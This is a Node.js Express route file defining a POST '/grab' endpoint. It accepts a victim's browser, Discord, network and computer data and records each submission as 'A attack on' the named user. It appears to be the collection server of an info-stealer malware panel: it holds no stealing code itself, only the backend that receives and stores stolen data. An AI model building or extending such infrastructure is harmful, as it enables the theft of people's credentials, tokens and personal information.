const express = require("express");
const db = require("../../database.js");
const router = express.Router();
const { generateToken } = require("../../service/utils.js");
const { createScan } = require("../../models/Scan.js");

router.post("/grab", (req, res) => {
  const { type, browser, discord, network, user, computer } = req.body;

  console.log("Data type: ", type); //information

  createScan({
    name: user,
    description: "A attack on " + user + ".",

    browser: browser,
    discord: discord,
    network: network,
    computer: computer,
  })
    .then((result) => {
      console.log("Result: ", result);
      res.json({ message: "success", id: result.id });
    })
    .catch((err) => {
      console.log("Error: ", err);
      res.status(400).json({ message: "failure" });
    });
});

module.exports = router;
